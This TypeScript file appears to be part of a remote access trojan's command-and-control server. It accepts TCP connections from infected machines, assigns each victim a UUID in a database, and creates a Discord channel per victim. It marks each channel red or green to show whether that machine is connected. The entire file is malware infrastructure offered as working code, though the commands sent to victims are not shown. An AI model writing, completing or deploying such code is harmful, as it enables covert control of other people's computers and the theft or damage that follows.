import { Socket } from "net";
import IRATClient from "../interfaces/IRATClient";
import RATServer from "./RATServer";
import TcpPacket from "./TcpPacket";
import { ChannelType } from "discord.js";
import Code from "../enums/Codes";

export default class RATClient implements IRATClient {
    connected: boolean;
    ratServer: RATServer;
    socket: Socket;
    uuid: string;

    constructor(socket: Socket, ratServer: RATServer, uuid: string) {
        this.connected = false;
        this.ratServer = ratServer;
        this.socket = socket;
        this.uuid = uuid;
        
        this.socket.on('close', async () => {
            this.connected = false;
            // remove the client from the clients array
            this.ratServer.removeClient(this);
        });
    }
    send(packet: TcpPacket): void {
        let data = packet.toUint8Array();
        this.socket.write(data, (error) => {
            if (error) {
                console.error(`Error sending data: ${error}`);
            }
        });
    }
    async receive(): Promise<TcpPacket | undefined> {
        try {
            // Read data from the socket
            let data = await new Promise<TcpPacket>((resolve, reject) => {
                this.socket.on('data', (chunk: Buffer) => {
                    resolve(new TcpPacket(chunk, undefined));
                });
                this.socket.on('error', (error: Error) => {
                    reject(error);
                });
            });
            if (!data) {
                throw new Error('No data received');
            }
            // Process the received data
            return data;
        } catch (error) {
            console.error(`Error reading data from socket: ${error}`);
        }
    }
    isConnected(): boolean {
        throw new Error("Method not implemented.");
    }

    disconnect(): void {
        console.log(`[RAT SERVER] Client disconnected with UUID ${this.uuid}`);
        this.socket.destroy();
    }

    async firstTimeConnect(): Promise<void> {
        const user = await this.ratServer.client.database.user.create({
                data: {
                    channelId: null
                }
            });

        let packet = new TcpPacket(Code.ASK_UUID, Buffer.from(user.uuid));
        this.send(packet);
        // Create a channel in a category using category ID
        let guild = this.ratServer.client.guilds.cache.get(this.ratServer.client.config.guildId) || null;
        if (!guild) {
            this.ratServer.client.guilds.fetch(this.ratServer.client.config.guildId);
            console.log(`Guild with ID ${this.ratServer.client.config.guildId} not found`);
            return;
        }
        const channel = await guild.channels.create({
            name: `🔴${user.uuid}`,
            type: ChannelType.GuildText,
            parent: this.ratServer.client.config.categoryId
        });
        // set the user's channel ID
        await this.ratServer.client.database.user.update({
            where: {
                uuid: user.uuid
            },
            data: {
                channelId: channel.id
            }
        });
        this.disconnect();
        return;
    }

    async connect(uuid: string): Promise<void> {
        this.uuid = uuid;
        const user = await this.ratServer.client.database.user.findUnique({
            where: {
                uuid: uuid
            }
        });
        if (!user) {
            console.log(`User with UUID ${uuid} not found`);
            this.disconnect();
            return;
        }

        // change the user's connected status to true
        await this.ratServer.client.database.user.update({
            where: {
                uuid: uuid
            },
            data: {
                connected: true
            }
        });
        
        // change the channel name to green
        //@ts-ignore
        // let channel = this.ratServer.client.channels.cache.get(user.channelId) as TextChannel;
        let channel = await this.ratServer.client.channels.fetch(user.channelId) as TextChannel;
        if (!channel) {
            //@ts-ignore
            if (!channel) {
                return;
            }               
        }
        try {
            await channel.setName(`🟢${channel.name.substring(2, channel.name.length)}`);
        } catch(error) {}
    }
}